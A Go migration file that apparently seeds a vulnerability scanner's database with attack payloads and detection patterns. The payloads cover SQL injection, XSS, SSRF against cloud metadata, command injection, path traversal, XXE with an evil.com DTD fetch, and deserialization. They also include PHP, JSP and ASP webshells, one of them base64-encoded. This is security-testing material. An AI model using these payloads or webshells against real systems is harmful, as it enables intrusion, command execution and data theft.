package migration

import (
	"vulnscan-backend/model"

	"gorm.io/gorm"
)

func seedDefaultPayloads(db *gorm.DB) error {
	var count int64
	db.Model(&model.VulnPayload{}).Count(&count)
	if count > 0 {
		return nil
	}

	payloads := []model.VulnPayload{
		// ═══ SQLi Payloads ═══
		{Category: "sqli", Name: "basic_quote", Value: "'", Type: "error", Databases: "all", Tags: "basic,quote", Enabled: true, SortOrder: 1},
		{Category: "sqli", Name: "double_quote", Value: "\"", Type: "error", Databases: "all", Tags: "basic,quote", Enabled: true, SortOrder: 2},
		{Category: "sqli", Name: "semicolon", Value: ";", Type: "error", Databases: "all", Tags: "basic", Enabled: true, SortOrder: 3},
		{Category: "sqli", Name: "or_true", Value: "1' OR '1'='1", Type: "boolean", Databases: "all", Tags: "boolean,or", Enabled: true, SortOrder: 10},
		{Category: "sqli", Name: "and_true", Value: "1 AND 1=1", Type: "boolean", Databases: "all", Tags: "boolean,and", Enabled: true, SortOrder: 11},
		{Category: "sqli", Name: "and_false", Value: "1 AND 1=2", Type: "boolean", Databases: "all", Tags: "boolean,and", Enabled: true, SortOrder: 12},
		{Category: "sqli", Name: "mysql_version", Value: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", Type: "error", Databases: "mysql", Tags: "error,extractvalue", Enabled: true, SortOrder: 20},
		{Category: "sqli", Name: "mysql_updatexml", Value: "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", Type: "error", Databases: "mysql", Tags: "error,updatexml", Enabled: true, SortOrder: 21},
		{Category: "sqli", Name: "mysql_sleep", Value: "1' AND SLEEP(5)--", Type: "time", Databases: "mysql", Tags: "time,sleep", Enabled: true, SortOrder: 22},
		{Category: "sqli", Name: "mysql_benchmark", Value: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", Type: "time", Databases: "mysql", Tags: "time,sleep", Enabled: true, SortOrder: 23},
		{Category: "sqli", Name: "mssql_version", Value: "1 AND 1=CONVERT(int,@@version)--", Type: "error", Databases: "mssql", Tags: "error,version", Enabled: true, SortOrder: 30},
		{Category: "sqli", Name: "mssql_waitfor", Value: "1'; WAITFOR DELAY '00:00:05'--", Type: "time", Databases: "mssql", Tags: "time,waitfor", Enabled: true, SortOrder: 31},
		{Category: "sqli", Name: "postgresql_version", Value: "1' AND 1=CAST(version() AS int)--", Type: "error", Databases: "postgresql", Tags: "error,version", Enabled: true, SortOrder: 40},
		{Category: "sqli", Name: "postgresql_sleep", Value: "1'; SELECT PG_SLEEP(5)--", Type: "time", Databases: "postgresql", Tags: "time,sleep", Enabled: true, SortOrder: 41},
		{Category: "sqli", Name: "postgresql_generate_series", Value: "1' AND (SELECT 9225 FROM PG_SLEEP(5))--", Type: "time", Databases: "postgresql", Tags: "time,sleep", Enabled: true, SortOrder: 42},
		{Category: "sqli", Name: "oracle_version", Value: "1' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--", Type: "error", Databases: "oracle", Tags: "error,version", Enabled: true, SortOrder: 50},
		{Category: "sqli", Name: "oracle_dbms_pipe", Value: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", Type: "time", Databases: "oracle", Tags: "time,dbms_pipe", Enabled: true, SortOrder: 51},
		{Category: "sqli", Name: "sqlite_version", Value: "1' AND 1=CAST(sqlite_version() AS int)--", Type: "error", Databases: "sqlite", Tags: "error,version", Enabled: true, SortOrder: 60},
		{Category: "sqli", Name: "sqlite_randomblob", Value: "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", Type: "time", Databases: "sqlite", Tags: "time,randomblob", Enabled: true, SortOrder: 61},
		{Category: "sqli", Name: "union_select", Value: "1' UNION SELECT NULL--", Type: "union", Databases: "all", Tags: "union", Enabled: true, SortOrder: 70},
		{Category: "sqli", Name: "union_select_2col", Value: "1' UNION SELECT NULL,NULL--", Type: "union", Databases: "all", Tags: "union", Enabled: true, SortOrder: 71},
		{Category: "sqli", Name: "union_select_3col", Value: "1' UNION SELECT NULL,NULL,NULL--", Type: "union", Databases: "all", Tags: "union", Enabled: true, SortOrder: 72},
		{Category: "sqli", Name: "union_version", Value: "1' UNION SELECT VERSION(),NULL--", Type: "union", Databases: "all", Tags: "union,version", Enabled: true, SortOrder: 73},

		// ═══ XSS Payloads ═══
		{Category: "xss", Name: "script_alert", Value: "<script>alert('{canary}')</script>", Type: "reflected", Expect: "<script>alert('{canary}')</script>", Context: "html", Tags: "basic,script", Enabled: true, SortOrder: 1},
		{Category: "xss", Name: "img_onerror", Value: "\"><img src=x onerror=alert('{canary}')>", Type: "reflected", Expect: "onerror=alert('{canary}')", Context: "attribute", Tags: "event-handler,img", Enabled: true, SortOrder: 2},
		{Category: "xss", Name: "svg_onload", Value: "'><svg/onload=alert('{canary}')>", Type: "reflected", Expect: "onload=alert('{canary}')", Context: "tag-break", Tags: "svg,onload", Enabled: true, SortOrder: 3},
		{Category: "xss", Name: "body_onload", Value: "\"><body onload=alert('{canary}')>", Type: "reflected", Expect: "onload=alert('{canary}')", Context: "tag-break", Tags: "event-handler,body", Enabled: true, SortOrder: 4},
		{Category: "xss", Name: "input_onfocus", Value: "\" onfocus=alert('{canary}') autofocus=\"", Type: "reflected", Expect: "onfocus=alert('{canary}')", Context: "attribute", Tags: "event-handler,input", Enabled: true, SortOrder: 5},
		{Category: "xss", Name: "video_source", Value: "<video><source onerror=\"alert('{canary}')\">", Type: "reflected", Expect: "onerror=\"alert('{canary}')\"", Context: "html", Tags: "event-handler,video", Enabled: true, SortOrder: 6},
		{Category: "xss", Name: "iframe_srcdoc", Value: "<iframe srcdoc=\"<img src=x onerror=alert('{canary}')>\">", Type: "reflected", Expect: "onerror=alert('{canary}')", Context: "html", Tags: "iframe,srcdoc", Enabled: true, SortOrder: 7},
		{Category: "xss", Name: "details_ontoggle", Value: "<details ontoggle=alert('{canary}') open>test</details>", Type: "reflected", Expect: "ontoggle=alert('{canary}')", Context: "html", Tags: "event-handler,details", Enabled: true, SortOrder: 8},
		{Category: "xss", Name: "marquee_onstart", Value: "<marquee onstart=alert('{canary}')>", Type: "reflected", Expect: "onstart=alert('{canary}')", Context: "html", Tags: "event-handler,marquee", Enabled: true, SortOrder: 9},
		{Category: "xss", Name: "javascript_uri", Value: "javascript:alert('{canary}')", Type: "reflected", Expect: "javascript:alert('{canary}')", Context: "uri", Tags: "javascript,uri", Enabled: true, SortOrder: 10},
		{Category: "xss", Name: "data_uri", Value: "data:text/html,<script>alert('{canary}')</script>", Type: "reflected", Expect: "<script>alert('{canary}')</script>", Context: "uri", Tags: "data,uri", Enabled: true, SortOrder: 11},
		{Category: "xss", Name: "template_literal", Value: "`<script>alert('{canary}')</script>`", Type: "reflected", Expect: "alert('{canary}')", Context: "js", Tags: "template,js", Enabled: true, SortOrder: 12},

		// ═══ CRLF Payloads ═══
		{Category: "crlf", Name: "crlf_setcookie", Value: "%0d%0aSet-Cookie:crlf=injected", Type: "header_injection", Expect: "Set-Cookie:crlf=injected", Tags: "cookie,injection", Enabled: true, SortOrder: 1},
		{Category: "crlf", Name: "crlf_location", Value: "%0d%0aLocation:https://evil.com", Type: "redirect", Expect: "Location:https://evil.com", Tags: "redirect,injection", Enabled: true, SortOrder: 2},
		{Category: "crlf", Name: "crlf_content_type", Value: "%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>CRLF</h1>", Type: "response_split", Expect: "Content-Type:text/html", Tags: "response-split", Enabled: true, SortOrder: 3},
		{Category: "crlf", Name: "crlf_x_xss", Value: "%0d%0aX-XSS-Protection:0", Type: "header_injection", Expect: "X-XSS-Protection:0", Tags: "security-header", Enabled: true, SortOrder: 4},
		{Category: "crlf", Name: "crlf_custom_header", Value: "%0d%0aX-CRLF-Test:injected", Type: "header_injection", Expect: "X-CRLF-Test:injected", Tags: "custom-header", Enabled: true, SortOrder: 5},

		// ═══ Host Header Payloads ═══
		{Category: "host_header", Name: "host_evil", Value: "evil.com", Type: "poisoning", Tags: "basic", Enabled: true, SortOrder: 1},
		{Category: "host_header", Name: "host_evil_port", Value: "evil.com:80", Type: "poisoning", Tags: "port", Enabled: true, SortOrder: 2},
		{Category: "host_header", Name: "host_array", Value: "evil.com, {host}", Type: "poisoning", Tags: "array", Enabled: true, SortOrder: 3},
		{Category: "host_header", Name: "host_forwarded", Value: "evil.com:443", Type: "forwarded", Tags: "forwarded", Enabled: true, SortOrder: 4},
		{Category: "host_header", Name: "host_x_forwarded", Value: "evil.com", Type: "x_forwarded", Tags: "x-forwarded", Enabled: true, SortOrder: 5},

		// ═══ SSRF Payloads ═══
		{Category: "ssrf", Name: "ssrf_localhost", Value: "http://127.0.0.1", Type: "basic", Tags: "localhost", Enabled: true, SortOrder: 1},
		{Category: "ssrf", Name: "ssrf_localhost_port", Value: "http://127.0.0.1:8080", Type: "basic", Tags: "localhost,port", Enabled: true, SortOrder: 2},
		{Category: "ssrf", Name: "ssrf_localhost_alt", Value: "http://localhost", Type: "basic", Tags: "localhost", Enabled: true, SortOrder: 3},
		{Category: "ssrf", Name: "ssrf_0_0_0_0", Value: "http://0.0.0.0", Type: "basic", Tags: "localhost", Enabled: true, SortOrder: 4},
		{Category: "ssrf", Name: "ssrf_metadata", Value: "http://169.254.169.254/latest/meta-data/", Type: "cloud_metadata", Tags: "aws,metadata", Enabled: true, SortOrder: 10},
		{Category: "ssrf", Name: "ssrf_metadata_aliyun", Value: "http://100.100.100.200/latest/meta-data/", Type: "cloud_metadata", Tags: "aliyun,metadata", Enabled: true, SortOrder: 11},
		{Category: "ssrf", Name: "ssrf_file_uri", Value: "file:///etc/passwd", Type: "file_read", Tags: "file,uri", Enabled: true, SortOrder: 20},
		{Category: "ssrf", Name: "ssrf_gopher", Value: "gopher://127.0.0.1:6379/_INFO", Type: "protocol", Tags: "gopher,redis", Enabled: true, SortOrder: 21},
		{Category: "ssrf", Name: "ssrf_dict", Value: "dict://127.0.0.1:6379/INFO", Type: "protocol", Tags: "dict,redis", Enabled: true, SortOrder: 22},

		// ═══ Command Injection Payloads ═══
		{Category: "cmdi", Name: "cmdi_semicolon", Value: ";id;", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 1},
		{Category: "cmdi", Name: "cmdi_pipe", Value: "|id|", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 2},
		{Category: "cmdi", Name: "cmdi_backtick", Value: "`id`", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 3},
		{Category: "cmdi", Name: "cmdi_dollar_paren", Value: "$(id)", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 4},
		{Category: "cmdi", Name: "cmdi_and", Value: "&&id&&", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 5},
		{Category: "cmdi", Name: "cmdi_sleep", Value: ";sleep 5;", Type: "time", Tags: "time,unix", Enabled: true, SortOrder: 10},
		{Category: "cmdi", Name: "cmdi_ping", Value: ";ping -c 5 127.0.0.1;", Type: "oob", Tags: "oob,ping", Enabled: true, SortOrder: 11},
		{Category: "cmdi", Name: "cmdi_windows_ping", Value: "&ping -n 5 127.0.0.1&", Type: "time", Tags: "time,windows", Databases: "windows", Enabled: true, SortOrder: 12},
		{Category: "cmdi", Name: "cmdi_whoami", Value: ";whoami;", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 20},
		{Category: "cmdi", Name: "cmdi_cat_passwd", Value: ";cat /etc/passwd;", Type: "rce", Tags: "rce,unix", Enabled: true, SortOrder: 21},

		// ═══ LFI Payloads ═══
		{Category: "lfi", Name: "lfi_etc_passwd", Value: "/etc/passwd", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 1},
		{Category: "lfi", Name: "lfi_etc_passwd_traversal", Value: "../../../../etc/passwd", Type: "traversal", Tags: "traversal,unix", Enabled: true, SortOrder: 2},
		{Category: "lfi", Name: "lfi_windows_boot", Value: "C:\\Windows\\System32\\drivers\\etc\\hosts", Type: "basic", Tags: "basic,windows", Databases: "windows", Enabled: true, SortOrder: 3},
		{Category: "lfi", Name: "lfi_php_filter", Value: "php://filter/convert.base64-encode/resource=index.php", Type: "filter", Tags: "php,filter", Enabled: true, SortOrder: 10},
		{Category: "lfi", Name: "lfi_php_input", Value: "php://input", Type: "input", Tags: "php,input", Enabled: true, SortOrder: 11},
		{Category: "lfi", Name: "lfi_data_uri", Value: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", Type: "data", Tags: "php,data", Enabled: true, SortOrder: 12},
		{Category: "lfi", Name: "lfi_expect", Value: "/etc/passwd%00", Type: "null_byte", Tags: "null-byte,unix", Enabled: true, SortOrder: 20},

		// ═══ SSTI Payloads ═══
		{Category: "ssti", Name: "ssti_jinja", Value: "{{7*7}}", Type: "basic", Tags: "jinja,basic", Enabled: true, SortOrder: 1},
		{Category: "ssti", Name: "ssti_jinja_config", Value: "{{config}}", Type: "config_leak", Tags: "jinja,config", Enabled: true, SortOrder: 2},
		{Category: "ssti", Name: "ssti_jinja_self", Value: "{{self}}", Type: "basic", Tags: "jinja,self", Enabled: true, SortOrder: 3},
		{Category: "ssti", Name: "ssti_freemarker", Value: "${7*7}", Type: "basic", Tags: "freemarker,basic", Enabled: true, SortOrder: 10},
		{Category: "ssti", Name: "ssti_freemarker_version", Value: "${freemarker.template.utility.Execute?new()('id')}", Type: "rce", Tags: "freemarker,rce", Enabled: true, SortOrder: 11},
		{Category: "ssti", Name: "ssti_thymeleaf", Value: "__${7*7}__", Type: "basic", Tags: "thymeleaf,basic", Enabled: true, SortOrder: 20},
		{Category: "ssti", Name: "ssti_twig", Value: "{{7*'7'}}", Type: "basic", Tags: "twig,basic", Enabled: true, SortOrder: 30},

		// ═══ XXE Payloads ═══
		{Category: "xxe", Name: "xxe_basic", Value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", Type: "file_read", Tags: "basic,file-read", Enabled: true, SortOrder: 1},
		{Category: "xxe", Name: "xxe_blind", Value: "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]><root></root>", Type: "blind", Tags: "blind,oob", Enabled: true, SortOrder: 2},
		{Category: "xxe", Name: "xxe_php_filter", Value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>", Type: "file_read", Tags: "php,filter", Enabled: true, SortOrder: 3},
		{Category: "xxe", Name: "xxe_expect", Value: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>", Type: "rce", Tags: "expect,rce", Enabled: true, SortOrder: 4},

		// ═══ NoSQL Injection Payloads ═══
		{Category: "nosqli", Name: "nosqli_ne", Value: "{\"$ne\": null}", Type: "basic", Tags: "basic,mongodb", Enabled: true, SortOrder: 1},
		{Category: "nosqli", Name: "nosqli_gt", Value: "{\"$gt\": \"\"}", Type: "basic", Tags: "basic,mongodb", Enabled: true, SortOrder: 2},
		{Category: "nosqli", Name: "nosqli_regex", Value: "{\"$regex\": \".*\"}", Type: "basic", Tags: "regex,mongodb", Enabled: true, SortOrder: 3},
		{Category: "nosqli", Name: "nosqli_where", Value: "'; return true; var foo='", Type: "basic", Tags: "javascript,mongodb", Enabled: true, SortOrder: 4},

		// ═══ JWT Security Payloads ═══
		{Category: "jwt", Name: "jwt_none_alg", Value: "{\"alg\":\"none\",\"typ\":\"JWT\"}", Type: "algorithm", Tags: "none,algorithm", Enabled: true, SortOrder: 1},
		{Category: "jwt", Name: "jwt_hmac2rsa", Value: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", Type: "confusion", Tags: "confusion,hmac", Enabled: true, SortOrder: 2},

		// ═══ Directory Traversal Payloads ═══
		{Category: "dir_traversal", Name: "traversal_basic", Value: "../../../../etc/passwd", Type: "basic", Tags: "basic,unix", Enabled: true, SortOrder: 1},
		{Category: "dir_traversal", Name: "traversal_encoded", Value: "..%2f..%2f..%2f..%2fetc%2fpasswd", Type: "encoded", Tags: "encoded,unix", Enabled: true, SortOrder: 2},
		{Category: "dir_traversal", Name: "traversal_double_encoded", Value: "..%252f..%252f..%252fetc%252fpasswd", Type: "double_encoded", Tags: "double-encoded,unix", Enabled: true, SortOrder: 3},
		{Category: "dir_traversal", Name: "traversal_windows", Value: "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", Type: "basic", Tags: "basic,windows", Enabled: true, SortOrder: 4},
		{Category: "dir_traversal", Name: "traversal_null_byte", Value: "../../../../etc/passwd%00", Type: "null_byte", Tags: "null-byte,unix", Enabled: true, SortOrder: 5},

		// ═══ Open Redirect Payloads ═══
		{Category: "open_redirect", Name: "redirect_http", Value: "http://evil.com", Type: "basic", Tags: "basic", Enabled: true, SortOrder: 1},
		{Category: "open_redirect", Name: "redirect_https", Value: "https://evil.com", Type: "basic", Tags: "basic", Enabled: true, SortOrder: 2},
		{Category: "open_redirect", Name: "redirect_protocol_relative", Value: "//evil.com", Type: "protocol_relative", Tags: "protocol-relative", Enabled: true, SortOrder: 3},
		{Category: "open_redirect", Name: "redirect_encoded", Value: "%2f%2fevil.com", Type: "encoded", Tags: "encoded", Enabled: true, SortOrder: 4},
		{Category: "open_redirect", Name: "redirect_data", Value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=", Type: "data", Tags: "data", Enabled: true, SortOrder: 5},

		// ═══ File Upload Payloads ═══
		{Category: "file_upload", Name: "upload_php", Value: "<?php system($_GET['cmd']); ?>", Type: "webshell", Tags: "php,webshell", Enabled: true, SortOrder: 1},
		{Category: "file_upload", Name: "upload_jsp", Value: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", Type: "webshell", Tags: "jsp,webshell", Enabled: true, SortOrder: 2},
		{Category: "file_upload", Name: "upload_asp", Value: "<%eval request(\"cmd\")%>", Type: "webshell", Tags: "asp,webshell", Enabled: true, SortOrder: 3},
		{Category: "file_upload", Name: "upload_svg_xss", Value: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"></svg>", Type: "xss", Tags: "svg,xss", Enabled: true, SortOrder: 4},
		{Category: "file_upload", Name: "upload_htaccess", Value: "AddType application/x-httpd-php .jpg", Type: "htaccess", Tags: "htaccess,bypass", Enabled: true, SortOrder: 5},

		// ═══ Deserialization Payloads ═══
		{Category: "deserialization", Name: "deser_java_ysoserial", Value: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAHcIAAAAP3g=", Type: "java", Tags: "java,ysoserial", Enabled: true, SortOrder: 1},
		{Category: "deserialization", Name: "deser_php_gadget", Value: "O:7:\"Example\":1:{s:4:\"data\";s:10:\"malicious\";}", Type: "php", Tags: "php,gadget", Enabled: true, SortOrder: 2},
		{Category: "deserialization", Name: "deser_python_pickle", Value: "gASVJQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSTlIWUUpQu", Type: "python", Tags: "python,pickle", Enabled: true, SortOrder: 3},
		{Category: "deserialization", Name: "deser_yaml_pyyaml", Value: "!!python/object/apply:os.system ['id']", Type: "python", Tags: "python,yaml", Enabled: true, SortOrder: 4},

		// ═══ Authentication Bypass Payloads ═══
		{Category: "auth_bypass", Name: "bypass_admin_true", Value: "admin'--", Type: "sqli", Tags: "sqli,admin", Enabled: true, SortOrder: 1},
		{Category: "auth_bypass", Name: "bypass_or_true", Value: "' OR 1=1--", Type: "sqli", Tags: "sqli,or", Enabled: true, SortOrder: 2},
		{Category: "auth_bypass", Name: "bypass_password_null", Value: "' OR ''='", Type: "sqli", Tags: "sqli,null", Enabled: true, SortOrder: 3},
		{Category: "auth_bypass", Name: "bypass_json_bool", Value: "{\"username\":\"admin\",\"password\":{\"$ne\":null}}", Type: "nosqli", Tags: "nosqli,mongodb", Enabled: true, SortOrder: 4},

		// ═══ Subdomain Takeover Payloads ═══
		{Category: "subdomain_takeover", Name: "takeover_aws_s3", Value: "NoSuchBucket", Type: "fingerprint", Tags: "aws,s3", Enabled: true, SortOrder: 1},
		{Category: "subdomain_takeover", Name: "takeover_github_pages", Value: "There isn't a GitHub Pages site here", Type: "fingerprint", Tags: "github,pages", Enabled: true, SortOrder: 2},
		{Category: "subdomain_takeover", Name: "takeover_heroku", Value: "No such app", Type: "fingerprint", Tags: "heroku", Enabled: true, SortOrder: 3},
		{Category: "subdomain_takeover", Name: "takeover_azure", Value: "404 Web Site not found", Type: "fingerprint", Tags: "azure", Enabled: true, SortOrder: 4},
		{Category: "subdomain_takeover", Name: "takeover_shopify", Value: "Sorry, this shop is currently unavailable", Type: "fingerprint", Tags: "shopify", Enabled: true, SortOrder: 5},
		{Category: "subdomain_takeover", Name: "takeover_wordpress", Value: "Do you want to register", Type: "fingerprint", Tags: "wordpress", Enabled: true, SortOrder: 6},

		// ═══ Clickjacking Payloads ═══
		{Category: "clickjacking", Name: "clickjacking_basic", Value: "<iframe src=\"{target}\" width=\"800\" height=\"600\"></iframe>", Type: "basic", Tags: "basic,iframe", Enabled: true, SortOrder: 1},
		{Category: "clickjacking", Name: "clickjacking_overlay", Value: "<div style=\"position:absolute;top:0;left:0;opacity:0.5\"><iframe src=\"{target}\" width=\"800\" height=\"600\"></iframe></div>", Type: "overlay", Tags: "overlay,iframe", Enabled: true, SortOrder: 2},

		// ═══ HTTP Smuggling Payloads ═══
		{Category: "http_smuggling", Name: "smuggling_cl_te", Value: "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n", Type: "cl_te", Tags: "cl-te", Enabled: true, SortOrder: 1},
		{Category: "http_smuggling", Name: "smuggling_te_cl", Value: "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", Type: "te_cl", Tags: "te-cl", Enabled: true, SortOrder: 2},
		{Category: "http_smuggling", Name: "smuggling_te_te", Value: "Transfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", Type: "te_te", Tags: "te-te", Enabled: true, SortOrder: 3},

		// ═══ XML-RPC Payloads ═══
		{Category: "xmlrpc", Name: "xmlrpc_system_list", Value: "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>", Type: "enum", Tags: "enum,system", Enabled: true, SortOrder: 1},
		{Category: "xmlrpc", Name: "xmlrpc_pingback", Value: "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com</string></value></param><param><value><string>{target}</string></value></param></params></methodCall>", Type: "ssrf", Tags: "ssrf,pingback", Enabled: true, SortOrder: 2},
		{Category: "xmlrpc", Name: "xmlrpc_bruteforce", Value: "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>{password}</string></value></param></params></methodCall>", Type: "bruteforce", Tags: "bruteforce,wordpress", Enabled: true, SortOrder: 3},
	}

	if err := db.Create(&payloads).Error; err != nil {
		return err
	}

	patterns := []model.VulnPayloadPattern{
		// ═══ SQLi Error Patterns ═══
		{Category: "sqli_error", Name: "mysql_error", Pattern: "(?i)(MySQL|mysql|MariaDB).*(error|syntax|warning|you have an error)", Description: "MySQL 错误信息", Severity: "high", Enabled: true},
		{Category: "sqli_error", Name: "mssql_error", Pattern: "(?i)(SQLServer|MSSQL|Microsoft SQL Server).*(error|syntax|OLE DB|ODBC)", Description: "MSSQL 错误信息", Severity: "high", Enabled: true},
		{Category: "sqli_error", Name: "postgresql_error", Pattern: "(?i)(PostgreSQL|PG|pg_).*(error|syntax|warning|ERROR:)", Description: "PostgreSQL 错误信息", Severity: "high", Enabled: true},
		{Category: "sqli_error", Name: "oracle_error", Pattern: "(?i)(Oracle|ORA-).*(error|syntax|warning|ORA-\\d+)", Description: "Oracle 错误信息", Severity: "high", Enabled: true},
		{Category: "sqli_error", Name: "generic_sql_error", Pattern: "(?i)(SQL syntax|SQL error|database error|query failed|unclosed quotation mark)", Description: "通用 SQL 错误", Severity: "high", Enabled: true},

		// ═══ Sensitive Data Patterns ═══
		{Category: "sensitive_data", Name: "email", Pattern: `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`, Description: "邮箱地址", Severity: "low", Enabled: true},
		{Category: "sensitive_data", Name: "phone_cn", Pattern: `1[3-9]\d{9}`, Description: "中国手机号", Severity: "medium", Enabled: true},
		{Category: "sensitive_data", Name: "id_card_cn", Pattern: `\d{17}[\dXx]`, Description: "中国身份证号", Severity: "high", Enabled: true},
		{Category: "sensitive_data", Name: "ip_address", Pattern: `\b(?:\d{1,3}\.){3}\d{1,3}\b`, Description: "IP 地址", Severity: "low", Enabled: true},
		{Category: "sensitive_data", Name: "aws_key", Pattern: `AKIA[0-9A-Z]{16}`, Description: "AWS Access Key", Severity: "critical", Enabled: true},
		{Category: "sensitive_data", Name: "private_key", Pattern: `-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----`, Description: "私钥文件", Severity: "critical", Enabled: true},
		{Category: "sensitive_data", Name: "jwt_token", Pattern: `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`, Description: "JWT Token", Severity: "high", Enabled: true},
		{Category: "sensitive_data", Name: "api_key_generic", Pattern: `(?i)(api[_-]?key|apikey)\s*[:=]\s*['"]?[a-zA-Z0-9]{20,}`, Description: "API Key", Severity: "high", Enabled: true},
		{Category: "sensitive_data", Name: "password_field", Pattern: `(?i)(password|passwd|pwd)\s*[:=]\s*['"]?[^\s'"]{4,}`, Description: "密码字段泄露", Severity: "critical", Enabled: true},
		{Category: "sensitive_data", Name: "connection_string", Pattern: `(?i)(mysql|postgres|mongodb|redis)://[^\s]+`, Description: "数据库连接字符串", Severity: "critical", Enabled: true},

		// ═══ DOM XSS Sinks ═══
		{Category: "dom_sink", Name: "document_write", Pattern: `document\.write\s*\(`, Description: "document.write sink", Severity: "medium", Enabled: true},
		{Category: "dom_sink", Name: "inner_html", Pattern: `\.innerHTML\s*=`, Description: "innerHTML sink", Severity: "medium", Enabled: true},
		{Category: "dom_sink", Name: "outer_html", Pattern: `\.outerHTML\s*=`, Description: "outerHTML sink", Severity: "medium", Enabled: true},
		{Category: "dom_sink", Name: "eval", Pattern: `eval\s*\(`, Description: "eval sink", Severity: "high", Enabled: true},
		{Category: "dom_sink", Name: "setTimeout_string", Pattern: `setTimeout\s*\(\s*['"']`, Description: "setTimeout string sink", Severity: "medium", Enabled: true},
		{Category: "dom_sink", Name: "setInterval_string", Pattern: `setInterval\s*\(\s*['"']`, Description: "setInterval string sink", Severity: "medium", Enabled: true},
		{Category: "dom_sink", Name: "location_href", Pattern: `location\.href\s*=`, Description: "location.href sink", Severity: "medium", Enabled: true},
		{Category: "dom_sink", Name: "location_assign", Pattern: `location\.assign\s*\(`, Description: "location.assign sink", Severity: "medium", Enabled: true},

		// ═══ DOM XSS Sources ═══
		{Category: "dom_source", Name: "location_hash", Pattern: `location\.hash`, Description: "location.hash source", Severity: "medium", Enabled: true},
		{Category: "dom_source", Name: "location_search", Pattern: `location\.search`, Description: "location.search source", Severity: "medium", Enabled: true},
		{Category: "dom_source", Name: "document_referrer", Pattern: `document\.referrer`, Description: "document.referrer source", Severity: "medium", Enabled: true},
		{Category: "dom_source", Name: "document_url", Pattern: `document\.URL`, Description: "document.URL source", Severity: "medium", Enabled: true},
		{Category: "dom_source", Name: "window_name", Pattern: `window\.name`, Description: "window.name source", Severity: "medium", Enabled: true},
		{Category: "dom_source", Name: "post_message", Pattern: `\.postMessage\s*\(`, Description: "postMessage source", Severity: "medium", Enabled: true},
	}

	if err := db.Create(&patterns).Error; err != nil {
		return err
	}

	configs := []model.VulnPayloadConfig{
		{Category: "sqli_boolean", ConfigKey: "true_payload", ConfigVal: "' AND '1'='1", Enabled: true},
		{Category: "sqli_boolean", ConfigKey: "false_payload", ConfigVal: "' AND '1'='2", Enabled: true},
		{Category: "session_fix_paths", ConfigKey: "login_paths", ConfigVal: `["/login","/signin","/auth/login","/api/login","/user/login","/admin/login","/wp-login.php","/auth","/oauth/authorize","/sso/login"]`, Enabled: true},
		{Category: "http_smuggling", ConfigKey: "cl_te_body", ConfigVal: "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n", Enabled: true},
		{Category: "http_smuggling", ConfigKey: "te_cl_body", ConfigVal: "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", Enabled: true},
	}

	if err := db.Create(&configs).Error; err != nil {
		return err
	}

	return nil
}
